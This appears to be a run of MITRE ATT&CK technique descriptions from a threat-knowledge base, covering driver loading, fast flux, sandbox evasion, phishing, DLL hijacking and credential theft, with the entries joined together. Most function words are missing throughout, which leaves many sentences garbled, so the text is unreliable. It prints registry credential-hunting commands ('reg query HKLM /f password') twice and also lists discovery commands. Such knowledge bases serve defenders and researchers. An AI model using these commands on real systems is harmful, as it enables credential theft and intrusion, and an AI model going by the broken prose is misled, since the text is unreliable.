Adversaries services install execute malicious drivers. example, dropping driver file (ex: `.sys`) disk, payload loaded registered [Native API](https://attack.mitre.org/techniques/T1106) functions `CreateServiceW()` (or manually functions `ZwLoadDriver()` `ZwSetValueKey()`), creating required service Registry values [Modify Registry](https://attack.mitre.org/techniques/T1112)), command-line utilities `PnPUtil.exe`.(Citation: Symantec W.32 Stuxnet Dossier)(Citation: Crowdstrike DriveSlayer February 2022)(Citation: Unit42 AcidBox June 2020) Adversaries leverage drivers [Rootkit](https://attack.mitre.org/techniques/T1014)s hide presence malicious activity system. Adversaries load signed vulnerable driver compromised machine (known "Bring Vulnerable Driver" (BYOVD)) [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068).(Citation: ESET InvisiMole June 2020)(Citation: Unit42 AcidBox June 2020)

Services created administrator privileges executed privileges, adversary service escalate privileges. Adversaries start services [Service Execution](https://attack.mitre.org/techniques/T1569/002). detection analysis challenging, malicious services incorporate [Masquerade Task Service](https://attack.mitre.org/techniques/T1036/004) (ex: service payload legitimate OS benign software component). Adversaries Fast Flux DNS hide command control channel array rapidly changing IP addresses linked single domain resolution. technique qualified domain name, multiple IP addresses assigned swapped frequency, combination robin IP addressing short Time-To-Live (TTL) DNS resource record.(Citation: MehtaFastFluxPt1)(Citation: MehtaFastFluxPt2)(Citation: Fast Flux - Welivesecurity)

The simplest, "single-flux" method, involves registering de-registering addresses DNS (address) record list single DNS name. registrations five-minute average lifespan, constant shuffle IP address resolution.(Citation: Fast Flux - Welivesecurity)

In contrast, "double-flux" method registers de-registers address DNS Server record list DNS zone, providing additional resilience connection. double-flux additional hosts proxy C2 host, insulating true source C2 channel. Adversaries employ checks detect avoid virtualization analysis environments. include changing behaviors based checks presence artifacts indicative virtual machine environment (VME) sandbox. adversary detects VME, alter malware disengage victim conceal core functions implant. search VME artifacts dropping secondary additional payloads. Adversaries learned [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) automated discovery shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Specific checks vary based target adversary, involve behaviors [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047), [PowerShell](https://attack.mitre.org/techniques/T1059/001), [System Discovery](https://attack.mitre.org/techniques/T1082), [Query Registry](https://attack.mitre.org/techniques/T1012) search VME artifacts. Adversaries search VME artifacts memory, processes, file system, hardware, Registry. Adversaries scripting automate checks  script program exit determines virtual environment. 

Checks include generic properties host/domain samples network traffic. Adversaries check network adapters addresses, CPU core count, memory/drive size. 

Other common checks enumerate services running unique applications, installed programs system, manufacturer/product fields strings relating virtual machine applications, VME-specific hardware/processor instructions.(Citation: McAfee Virtual Jan 2017) applications VMWare, adversaries special I/O port send commands receive output. 
 
Hardware checks, presence fan, temperature, audio devices, gather evidence indicative virtual environment. Adversaries query specific readings devices.(Citation: Unit 42 OilRig Sept 2018) Adversaries abuse <code>cron</code> utility perform task scheduling initial recurring execution malicious code.(Citation: 20 macOS Common Tools Techniques) <code>cron</code> utility time-based job scheduler Unix-like operating systems.  <code> crontab</code> file schedule cron entries times execution. <code>crontab</code> files stored operating system-specific file paths.

An adversary <code>cron</code> Linux Unix environments execute programs startup scheduled basis [Persistence](https://attack.mitre.org/tactics/TA0003).  Adversaries attempt domain-level permission settings. knowledge domain-level permission adversaries determine exist users belong group. Adversaries determine users elevated permissions, domain administrators.

Commands <code>net /domain</code> [Net](https://attack.mitre.org/software/S0039) utility,  <code>dscacheutil -q group</code> macOS, <code>ldapsearch</code> Linux list domain-level groups. Adversaries acquire vulnerabilities targeting. vulnerability weakness hardware software can, potentially, exploited adversary unintended unanticipated behavior occur. Adversaries vulnerability searching databases gaining access closed vulnerability databases.(Citation: National Vulnerability Database)

An adversary monitor vulnerability disclosures/databases understand existing, newly discovered, vulnerabilities. delay vulnerability discovered public. adversary target systems conduct vulnerability (including commercial vendors). Knowledge vulnerability adversary search existing exploit [Exploits](https://attack.mitre.org/techniques/T1588/005)) attempt develop [Exploits](https://attack.mitre.org/techniques/T1587/004)). Adversaries send spearphishing emails malicious link attempt gain access victim systems. Spearphishing link specific variant spearphishing. forms spearphishing employs links download malware contained email, attaching malicious files email itself, avoid defenses inspect email attachments. Spearphishing involve social engineering techniques, posing trusted source.

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. case, malicious emails links. Generally, links accompanied social engineering require user actively paste URL browser, leveraging [User Execution](https://attack.mitre.org/techniques/T1204). visited compromise browser exploit, user prompted download applications, documents, zip files, executables depending pretext email place. Adversaries include links intended interact email reader, including embedded images intended exploit verify receipt email bugs/web beacons). Additionally, adversaries seemingly benign links abuse special characters mimic legitimate websites (known "IDN homograph attack").(Citation: CISA IDN ST05-016)

Adversaries utilize links perform consent phishing, typically OAuth 2.0 request URLs accepted user provide permissions/access malicious applications, allowing adversaries  [Steal Application Access Token](https://attack.mitre.org/techniques/T1528)s.(Citation: Trend Micro Pawn Storm OAuth 2017) stolen access tokens adversary perform actions behalf user API calls. (Citation: OAuth 2.0 Consent Phishing 2021) Apple’s documentation, startup items execute final phase boot process scripts executable files configuration determine execution startup items (Citation: Startup Items). technically deprecated version (superseded Launch Daemons), folder, <code>/Library/StartupItems</code> isn’t guaranteed exist default, exist default macOS Sierra. startup item directory executable configuration property list (plist), <code>StartupParameters.plist</code>, reside top-level directory. 

An adversary create folders/files StartupItems directory register persistence mechanism (Citation: Methods Mac Malware Persistence). Additionally, StartupItems bootup phase macOS, root. adversary modify existing Startup Item, Privilege Escalate well. Adversaries logs hide evidence intrusion. macOS Linux track user-initiated actions logs. majority native logging stored <code>/var/log/</code> directory. Subfolders directory categorize logs functions, as:(Citation: Linux Logs)

* <code>/var/log/messages:</code>: system-related messages
* <code>/var/log/secure</code> <code>/var/log/auth.log</code>: Authentication logs
* <code>/var/log/utmp</code> <code>/var/log/wtmp</code>: Login records
* <code>/var/log/kern.log</code>: Kernel logs
* <code>/var/log/cron.log</code>: Crond logs
* <code>/var/log/maillog</code>: Mail server logs
* <code>/var/log/httpd/</code>: server access error logs
 Adversaries exploit software vulnerabilities application crash deny availability users. (Citation: Sucuri BIND9 August 2015) systems automatically restart critical applications services crashes occur, re-exploited persistent denial service (DoS) condition.

Adversaries exploit zero-day vulnerabilities crash applications systems, lead dependent applications systems DoS condition. Crashed restarted applications systems effects [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. DoS condition deny availability critical information, applications systems.  Adversaries leverage Office-based applications persistence startups. Office common application suite Windows-based operating systems enterprise network. multiple mechanisms Office persistence Office-based application started; include Office Template Macros add-ins.

A variety features discovered Outlook abused persistence, Outlook rules, forms, Page.(Citation: SensePost Ruler GitHub) persistence mechanisms Outlook Office 365.(Citation: TechNet O365 Outlook Rules) Adversaries InstallUtil proxy execution code trusted Windows utility. InstallUtil command-line utility installation uninstallation resources executing specific installer components .NET binaries. (Citation: MSDN InstallUtil) InstallUtil binary digitally signed located .NET directories Windows system: <code>C:\Windows\Microsoft.NET\Framework\v<version>\InstallUtil.exe</code> <code>C:\Windows\Microsoft.NET\Framework64\v<version>\InstallUtil.exe</code>.

InstallUtil bypass application control attributes binary execute class decorated attribute <code>[System.ComponentModel.RunInstaller(true)]</code>. (Citation: LOLBAS Installutil) Adversaries send spearphishing messages malicious link elicit sensitive targeting. Spearphishing attempt trick targets divulging information, frequently credentials actionable information. Spearphishing frequently involves social engineering techniques, posing source reason collect (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) sending multiple, seemingly urgent messages.

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, malicious emails links accompanied social engineering coax user actively paste URL browser.(Citation: TrendMictro Phishing)(Citation: PCMag FakeLogin) clone legitimate (such online corporate login portal) closely resemble legitimate appearance URL elements real site. 

From fake website, gathered forms adversary. Adversaries previous reconnaissance efforts (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) craft persuasive believable lures. Adversaries [Valid Accounts](https://attack.mitre.org/techniques/T1078) log remote machines Secure (SSH). adversary perform actions logged-on user.

SSH protocol authorized users remote shells computers. Linux macOS versions SSH installed default, typically disabled user enables it. SSH server configured standard password authentication public-private keypairs lieu addition password. authentication scenario, user’s public key special file running server lists keypairs allowed login user. adversary add additional roles permissions adversary-controlled cloud account maintain persistent access tenant. example, adversaries update IAM policies cloud-based environments add global administrator Office 365 environments.(Citation: AWS IAM Policies Permissions)(Citation: Google Cloud IAM Policies)(Citation: Support O365 Add Admin, October 2019)(Citation: O365 Admin Roles) sufficient permissions, compromised account gain unlimited access data settings (including ability reset passwords admins).(Citation: Expel AWS Attacker)
(Citation: O365 Admin Roles) 

This account modification follow [Create Account](https://attack.mitre.org/techniques/T1136) malicious account activity. Adversaries modify existing [Valid Accounts](https://attack.mitre.org/techniques/T1078) compromised. lead privilege escalation, roles lateral movement additional accounts.

For example, Azure environments, adversary Application Administrator role add [Additional Cloud Credentials](https://attack.mitre.org/techniques/T1098/001) application's service principal. adversary gain service principal’s roles permissions, Application Administrator.(Citation: SpecterOps Azure Privilege Escalation) Similarly, AWS environments, adversary permissions <code>CreatePolicyVersion</code> API define version IAM policy <code>AttachUserPolicy</code> API attach IAM policy additional distinct permissions compromised user account.(Citation: Rhino Security Labs AWS Privilege Escalation)

Similarly, adversary Azure Global Administrator role toggle “Access management Azure resources” option gain ability assign privileged access Azure subscriptions virtual machines Azure users, including themselves.(Citation: Azure AD)  Adversaries abuse print processors malicious DLLs boot persistence privilege escalation. Print processors DLLs loaded print spooler service, spoolsv.exe, boot. 

Adversaries abuse print spooler service adding print processors load malicious DLLs startup. print processor installed <code>AddPrintProcessor</code> API account <code>SeLoadDriverPrivilege</code> enabled. Alternatively, print processor registered print spooler service adding <code>HKLM\SYSTEM\\[CurrentControlSet ControlSet001]\Control\Print\Environments\\[Windows architecture: e.g., Windows x64]\Print Processors\\[user defined]\Driver</code> Registry key DLL. print processor correctly installed, located print-processor directory <code>GetPrintProcessorDirectory</code> API call.(Citation: AddPrintProcessor 2018) print processors installed, print spooler service, starts boot, restarted run.(Citation: ESET PipeMon 2020) print spooler service runs level permissions, print processors installed adversary elevated privileges. Adversaries disable security tools avoid detection tools activities. form killing security software event logging processes, deleting Registry tools start time, methods interfere security scanning event reporting. Adversaries corrupt wipe disk data structures hard drive boot systems; targeting specific critical systems systems network interrupt availability network resources. 

Adversaries attempt render unable boot overwriting critical data located structures master boot record (MBR) partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) data contained disk structures include initial executable code loading operating location file partitions disk. present, load operating boot process, leaving unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1487) performed isolation, [Disk Content Wipe](https://attack.mitre.org/techniques/T1488) sectors disk wiped.

To maximize impact target organization, malware designed destroying disk structures worm-like features propagate network leveraging techniques [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), [Windows Admin Shares](https://attack.mitre.org/techniques/T1077).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017) Adversaries send spearphishing emails malicious attachment attempt gain access victim systems. Spearphishing attachment specific variant spearphishing. Spearphishing attachment forms spearphishing employs malware attached email. forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, adversaries attach file spearphishing email rely [User Execution](https://attack.mitre.org/techniques/T1204) gain execution. Spearphishing involve social engineering techniques, posing trusted source.

There options attachment Office documents, executables, PDFs, archived files. attachment (and clicking protections), adversary's payload exploits vulnerability executes user's system. spearphishing email plausible reason file opened, explain bypass protections so. email instructions decrypt attachment, zip file password, evade email boundary defenses. Adversaries frequently manipulate file extensions icons attached executables document files, files exploiting application file one.  Windows Registry stores configuration programs. Adversaries query Registry credentials passwords stored programs services. credentials automatic logons.

Example commands Registry password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code> Adversaries attempt payload difficult analyze removing symbols, strings, human readable information. Scripts executables variables names strings developers document code functionality. Symbols created operating system’s `linker` executable payloads compiled. Reverse engineers symbols strings analyze code identify functionality payloads.(Citation: Mandiant golang stripped binaries explanation)(Citation: intezer stripped binaries elf files 2018)

Adversaries stripped payloads malware analysis difficult. example, compilers tools provide features remove obfuscate strings symbols. Adversaries stripped payload formats, run-only AppleScripts, compiled stripped version [AppleScript](https://attack.mitre.org/techniques/T1059/002), evade detection analysis. lack human-readable hinder detection analysis payloads.(Citation: SentinelLabs reversing run-only applescripts 2021) Adversaries Windows Component Object Model (COM) local code execution. inter-process communication (IPC) component native Windows application programming interface (API) enables interaction software objects, executable code implements interfaces.(Citation: Fireeye Hunting June 2019) COM, client object methods server objects, typically binary Dynamic Link Libraries (DLL) executables (EXE).(Citation: COM) Remote execution facilitated [Remote Services](https://attack.mitre.org/techniques/T1021)  [Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003) (DCOM).(Citation: Fireeye Hunting June 2019)

Various interfaces exposed abused invoke arbitrary execution variety programming languages C, C++, Java, [Visual Basic](https://attack.mitre.org/techniques/T1059/005).(Citation: COM) Specific objects exist perform functions code execution, creating [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), fileless download/execution, adversary behaviors privilege escalation persistence.(Citation: Fireeye Hunting June 2019)(Citation: ProjectZero File Write EoP Apr 2018) Adversaries execute malicious payloads hijacking search load DLLs. Windows systems common method required DLLs load program. (Citation: Dynamic Link Library Search Order)(Citation: FireEye Hijacking July 2010) Hijacking DLL loads purpose establishing persistence elevating privileges evading restrictions file execution.

There adversary hijack DLL loads. Adversaries plant trojan dynamic-link library files (DLLs) directory searched location legitimate library requested program, causing Windows load malicious library called victim program. Adversaries perform DLL preloading, called binary planting attacks, (Citation: OWASP Binary Planting) placing malicious DLL ambiguously DLL location Windows searches legitimate DLL. location current directory program.(Citation: FireEye fxsst June 2011) Remote DLL preloading attacks occur program sets current directory remote location share loading DLL. (Citation: Security Advisory 2269637)

Adversaries modify search DLL redirection, enabled (in Registry creation redirection file) program load DLL.(Citation: Dynamic-Link Library Redirection)(Citation: Manifests)(Citation: FireEye DLL Search Hijacking)

If search order-vulnerable program configured privilege level, adversary-controlled DLL loaded executed level. case, technique privilege escalation user administrator administrator SYSTEM, depending program. Programs fall victim path hijacking behave malicious DLLs configured load legitimate DLLs meant replace. established network, adversary automated techniques collecting internal data. Methods performing technique include [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059) search fitting set criteria file type, location, specific time intervals. cloud-based environments, adversaries cloud APIs, command interfaces, extract, transform, load (ETL) services automatically collect data. functionality built remote access tools. 

This technique incorporate techniques [File Directory Discovery](https://attack.mitre.org/techniques/T1083) [Lateral Tool Transfer](https://attack.mitre.org/techniques/T1570) identify files, [Cloud Service Dashboard](https://attack.mitre.org/techniques/T1538) [Cloud Storage Object Discovery](https://attack.mitre.org/techniques/T1619) identify resources cloud environments. Adversaries collect data stored clipboard users copying applications. 

In Windows, Applications access clipboard data Windows API.(Citation: MSDN Clipboard) OSX native command, <code>pbpaste</code>, grab clipboard contents.(Citation: Operating EmPyre) Adversaries gather credentials stored Proc filesystem <code>/proc</code>. Proc filesystem Linux deal running operating system. Processes running root privileges facility scrape live memory running programs. programs store passwords password hashes memory, values harvested usage brute force attacks, respectively.

This functionality implemented MimiPenguin(Citation: MimiPenguin GitHub 2017), source tool inspired Mimikatz. tool dumps process memory, harvests passwords hashes strings regex patterns applications Gnome Keyring, sshd, Apache memory store authentication artifacts. Adversaries buy, lease, rent network compromised systems that targeting. botnet network compromised systems instructed perform coordinated tasks.(Citation: Norton Botnet) Adversaries purchase subscription existing botnet booter/stresser service. botnet disposal, adversaries perform follow-on activity large-scale [Phishing](https://attack.mitre.org/techniques/T1566) Distributed Denial Service (DDoS).(Citation: Imperva DDoS Hire)(Citation: Krebs-Anna)(Citation: Krebs-Bazaar)(Citation: Krebs-Booter) Adversaries acquire user credentials third-party password managers.(Citation: ise Password Manager February 2019) Password managers applications designed store user credentials, encrypted database. Credentials typically accessible user master password unlocks database. database unlocked, credentials copied memory. databases stored files disk.(Citation: ise Password Manager February 2019)

Adversaries acquire user credentials password managers extracting master password plain-text credentials memory.(Citation: FoxIT Wocao December 2019)(Citation: Github KeeThief) Adversaries extract credentials memory [Exploitation Credential Access](https://attack.mitre.org/techniques/T1212).(Citation: NVD CVE-2019-3610)
 Adversaries brute forcing [Password Guessing](https://attack.mitre.org/techniques/T1110/001) master password password manager.(Citation: Cyberreason Anchor December 2019) Dynamic-link libraries (DLLs) AppInit_DLLs Registry <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Windows</code> <code>HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows</code> loaded user32.dll process loads user32.dll. practice program, user32.dll common library. (Citation: Elastic Process Injection July 2017) [Process Injection](https://attack.mitre.org/techniques/T1055), values abused persistence privilege escalation causing malicious DLL loaded context separate processes computer. (Citation: AppInit Registry)

The AppInit DLL functionality disabled Windows 8 versions secure boot enabled. (Citation: AppInit Secure Boot) Adversaries modify file attributes subvert Gatekeeper functionality evade user prompts execute untrusted programs. Gatekeeper set technologies layer Apple’s security model ensure trusted applications executed host. Gatekeeper built File Quarantine Snow Leopard (10.6, 2009) grown include Code Signing, security policy compliance, Notarization, more. Gatekeeper treats applications running time reopened applications.(Citation: TheEclecticLightCompany Quarantine flag)(Citation: TheEclecticLightCompany apple notarization )

Based opt-in system, files downloaded extended attribute (xattr) called `com.apple.quarantine` (also quarantine flag) set file application performing download. Launch Services application suspended state. applications quarantine flag set, Gatekeeper executes functions:

1. Checks extended attribute – Gatekeeper checks quarantine flag, alert prompt user deny execution.(Citation: OceanLotus OS X)(Citation: 20 macOS Common Tools Techniques)

2. Checks Policies - Gatekeeper checks security policy, allowing execution apps downloaded App Store App Store identified developers.

3. Code Signing – Gatekeeper checks valid code signature Apple Developer ID.

4. Notarization - `api.apple-cloudkit.com` API, Gatekeeper reaches Apple servers verify pull notarization ticket ensure ticket revoked. Users override notarization, result prompt executing “unauthorized app” security policy modified.

Adversaries subvert multiple security controls Gatekeeper checks logic errors (e.g. [Exploitation Defense Evasion](https://attack.mitre.org/techniques/T1211)), unchecked file types, external libraries. example, prior macOS 13 Ventura, code signing notarization checks conducted launch, allowing adversaries write malicious executables applications bypass Gatekeeper security checks.(Citation: theevilbit gatekeeper bypass 2021)(Citation: Application Bundle Manipulation Brandon Dalton)

Applications files loaded USB flash drive, optical disk, external hard drive, drive shared local network, curl command set quarantine flag. Additionally, avoid setting quarantine flag [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries prepare operational environment infect systems visit normal browsing. Endpoint systems compromised browsing adversary controlled sites, [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). cases, user's browser typically targeted exploitation (often requiring extra user interaction landing site), adversaries set websites non-exploitation behavior [Application Access Token](https://attack.mitre.org/techniques/T1550/001). Prior [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), adversaries stage resources deliver exploit users browse adversary controlled site. Drive-by content staged adversary controlled infrastructure acquired ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)).

Adversaries upload inject malicious content, [JavaScript](https://attack.mitre.org/techniques/T1059/007), websites.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015) ways, including inserting malicious script user controllable content forum posts. Adversaries craft malicious advertisements purchase space legitimate providers. addition staging content exploit user's browser, adversaries stage scripting content profile user's browser (as [Gather Victim Host Information](https://attack.mitre.org/techniques/T1592)) ensure vulnerable prior attempting exploitation.(Citation: ATT ScanBox)

Websites compromised adversary stage drive-by visited specific community, government, industry, region, goal compromise specific user set users based shared interest. targeted campaign referred strategic compromise watering hole attack.

Adversaries purchase domains legitimate domains (ex: homoglyphs, typosquatting, top-level domain, etc.) acquisition infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) facilitate [Drive-by Compromise](https://attack.mitre.org/techniques/T1189). Adversaries gather registered local services. Adversaries services tools OS utility commands <code>sc query</code>, <code>tasklist /svc</code>, <code>systemctl --type=service</code>, <code>net start</code>.

Adversaries [System Service Discovery](https://attack.mitre.org/techniques/T1007) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions. Adversaries sniff network traffic capture environment, including authentication material passed network. Network sniffing refers network interface monitor capture wired wireless connection. adversary network interface promiscuous mode passively access data transit network, span ports capture larger data.

Data captured technique include user credentials, insecure, unencrypted protocol. Techniques service resolution poisoning, [LLMNR/NBT-NS Poisoning SMB Relay](https://attack.mitre.org/techniques/T1557/001), capture credentials websites, proxies, internal systems redirecting traffic adversary.

Network sniffing reveal configuration details, running services, version numbers, network characteristics (e.g. IP addresses, hostnames, VLAN IDs) subsequent Lateral Movement Defense Evasion activities.

In cloud-based environments, adversaries traffic mirroring services sniff network traffic virtual machines. example, AWS Traffic Mirroring, GCP Packet Mirroring, Azure vTap users define instances collect traffic targets send collected traffic to.(Citation: AWS Traffic Mirroring) (Citation: GCP Packet Mirroring) (Citation: Azure Virtual Network TAP) Often, traffic cleartext TLS termination load balancer level reduce strain encrypting decrypting traffic.(Citation: Rhino Security Labs AWS VPC Traffic Mirroring) (Citation: SpecterOps AWS Traffic Mirroring) adversary exfiltration techniques Transfer Data Cloud Account access sniffed traffic. (Citation: Rhino Security Labs AWS VPC Traffic Mirroring) Adversaries deploy malicious software systems network application deployment systems employed enterprise administrators. permissions required action vary configuration; local credentials sufficient direct access deployment server, specific domain credentials required. However, require administrative account log perform software deployment.

Access network-wide enterprise-wide software deployment enables adversary remote code execution systems connected system. access laterally systems, gather information, specific effect, wiping hard drives endpoints. Adversaries create, acquire, steal code signing materials sign malware tools. Code signing level authenticity binary developer guarantee binary tampered with. (Citation: Wikipedia Code Signing) certificates operation created, acquired, stolen adversary. (Citation: Securelist Digital Certificates) (Citation: Symantec Digital Certificates) [Invalid Code Signature](https://attack.mitre.org/techniques/T1036/001), activity result valid signature.

Code signing verify software modern Windows macOS systems. Linux decentralized nature platform. (Citation: Wikipedia Code Signing)(Citation: EclecticLightChecksonEXECodeSigning)

Code signing certificates bypass security policies require signed code execute system.  Adversaries access data improperly secured cloud storage.

Many cloud service providers offer solutions online data object storage Amazon S3, Azure Storage, Google Cloud Storage. solutions storage solutions (such SQL Elasticsearch) overarching application. Data solutions retrieved cloud provider's APIs. 

In cases, SaaS application providers Slack, Confluence, Salesforce provide cloud storage solutions peripheral platform. cloud objects extracted application.(Citation: EA Hacked Slack - June 2021)(Citation: SecureWorld - Secure Slack Channel - Dec 2021)(Citation: HackerNews - 3 SaaS App Cyber Attacks - April 2022)(Citation: Dark Clouds_Usenix_Mulazzani_08_2011)

Adversaries collect sensitive data cloud storage solutions. Providers typically offer security guides users configure systems, misconfigurations common problem.(Citation: Amazon S3 Security, 2019)(Citation: Azure Storage Security, 2019)(Citation: Google Cloud Storage Practices, 2019) numerous incidents cloud storage improperly secured, typically unintentionally allowing public access unauthenticated users, overly-broad access users, access anonymous person control Identity Access Management basic user permissions.

This access expose types sensitive data, credit cards, personally identifiable information, medical records.(Citation: Trend Micro S3 Exposed PII, 2017)(Citation: Wired Magecart S3 Buckets, 2019)(Citation: HIPAA Journal S3 Breach, 2017)(Citation: Rclone-mega-extortion_05_2021)

Adversaries abuse leaked credentials source repositories, logs, gain access cloud storage objects. Adversaries modify systems manipulate data accessed displayed user, threatening integrity data.(Citation: FireEye APT38 Oct 2018)(Citation: DOJ Lazarus Sony 2018) manipulating runtime data, adversaries attempt affect business process, organizational understanding, decision making.

Adversaries alter application binaries display data runtime manipulations. Adversaries conduct [Change Default File Association](https://attack.mitre.org/techniques/T1546/001) [Masquerading](https://attack.mitre.org/techniques/T1036) effect. type modification impact depends target application process goals objectives adversary. complex systems, adversary special expertise access specialized software typically gained prolonged gathering campaign desired impact. Adversaries search Registry compromised systems insecurely stored credentials. Windows Registry stores configuration programs. Adversaries query Registry credentials passwords stored programs services. credentials automatic logons.

Example commands Registry password information: (Citation: Pentestlab Stored Credentials)

* Local Machine Hive: <code>reg query HKLM /f password /t REG_SZ /s</code>
* Current User Hive: <code>reg query HKCU /f password /t REG_SZ /s</code> Adversaries folders drives shared remote systems identifying sources gather precursor Collection identify potential systems Lateral Movement. Networks shared network drives folders enable users access file directories systems network. 

File sharing Windows network occurs SMB protocol. (Citation: Wikipedia Shared Resource) (Citation: TechNet Shared Folder) [Net](https://attack.mitre.org/software/S0039) query remote shared drives <code>net view \\\\remotesystem</code> command. query shared drives local <code>net share</code>. macOS, <code>sharing -l</code> command lists shared smb services. Adversaries attempt gather attached peripheral devices components connected system.(Citation: Peripheral Discovery Linux)(Citation: Peripheral Discovery macOS) Peripheral devices include auxiliary resources support variety functionalities keyboards, printers, cameras, smart card readers, removable storage. enhance awareness network environment actions. Adversaries gather victim's network topology targeting. network topologies include variety details, including physical logical arrangement external-facing internal network environments. include specifics network devices (gateways, routers, etc.) infrastructure.

Adversaries gather ways, direct collection actions [Active Scanning](https://attack.mitre.org/techniques/T1595) [Phishing Information](https://attack.mitre.org/techniques/T1598). network topologies exposed adversaries online accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: DNS Dumpster) Gathering reveal opportunities forms reconnaissance (ex: [Search Technical Databases](https://attack.mitre.org/techniques/T1596) [Search Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)). Adversaries create self-signed code signing certificates targeting. Code signing process digitally signing executables scripts confirm software author guarantee code altered corrupted. Code signing level authenticity program developer guarantee program tampered with.(Citation: Wikipedia Code Signing) Users security tools trust signed piece code unsigned piece code issued certificate author is.

Prior [Code Signing](https://attack.mitre.org/techniques/T1553/002), adversaries develop self-signed code signing certificates operations. Adversaries modify file directory permissions/attributes evade access control lists (ACLs) access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 2018) File directory permissions commonly managed ACLs configured file directory owner, users permissions. File directory ACL implementations vary platform, explicitly designate users perform actions (read, write, execute, etc.).

Windows implements file directory ACLs Discretionary Access Control Lists (DACLs).(Citation: DACL 2018) standard ACL, DACLs identifies accounts allowed denied access securable object. attempt access securable object, checks access control entries DACL order. matching entry found, access object granted. Otherwise, access denied.(Citation: Access Control Lists 2018)

Adversaries interact DACLs built-in Windows commands, `icacls`, `cacls`, `takeown`, `attrib`, grant adversaries permissions specific files folders. Further, [PowerShell](https://attack.mitre.org/techniques/T1059/001) cmdlets retrieve modify file directory DACLs. Specific file directory modifications required step techniques, establishing Persistence [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), tainting/hijacking instrumental binary/configuration files [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574). Adversaries abuse Office add-ins persistence compromised system. Office add-ins add functionality Office programs. (Citation: Office Add-ins) types add-ins Office products; including Word/Excel add-in Libraries (WLL/XLL), VBA add-ins, Office Component Object Model (COM) add-ins, automation add-ins, VBA Editor (VBE), Visual Studio Tools Office (VSTO) add-ins, Outlook add-ins. (Citation: MRWLabs Office Persistence Add-ins)(Citation: FireEye Mail CDS 2018)

Add-ins persistence set execute code Office application starts.  Adversaries abuse transport agents establish persistent access systems. Exchange transport agents operate email messages passing transport pipeline perform tasks filtering spam, filtering malicious attachments, journaling, adding corporate signature outgoing emails.(Citation: TransportAgent Jun 2016)(Citation: ESET LightNeuron 2019) Transport agents written application developers compiled .NET assemblies subsequently registered Exchange server. Transport agents invoked stage email processing carry developer defined tasks. 

Adversaries register malicious transport agent provide persistence mechanism Exchange Server triggered adversary-specified email events.(Citation: ESET LightNeuron 2019) malicious transport agent invoked emails passing Exchange transport pipeline, agent configured carry specific tasks response adversary defined criteria. example, transport agent carry action copying in-transit attachments saving exfiltration recipient email address matches entry list adversary.  adversary attempt detailed operating hardware, including version, patches, hotfixes, service packs, architecture. Adversaries [System Discovery](https://attack.mitre.org/techniques/T1082) automated discovery shape follow-on behaviors, including adversary infects target attempts specific actions.

Tools [Systeminfo](https://attack.mitre.org/software/S0096) gather detailed information. running privileged access, breakdown data gathered <code>systemsetup</code> configuration tool macOS. example, adversaries user-level access execute <code>df -aH</code> command mounted disks freely space. Adversaries leverage [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) network devices gather detailed (e.g. <code>show version</code>).(Citation: US-CERT-TA18-106A) [System Discovery](https://attack.mitre.org/techniques/T1082) combined gathered forms discovery reconnaissance drive payload development concealment.(Citation: OSX.FairyTale)(Citation: 20 macOS Common Tools Techniques)

Infrastructure Service (IaaS) cloud providers AWS, GCP, Azure access instance virtual machine APIs. Successful authenticated API calls return data operating platform status instance model view virtual machine.(Citation: Amazon Instance)(Citation: Google Instances Resource)(Citation: Virutal Machine API) Adversaries communicate application layer protocols avoid detection/network filtering blending existing traffic. Commands remote system, commands, embedded protocol traffic client server. 

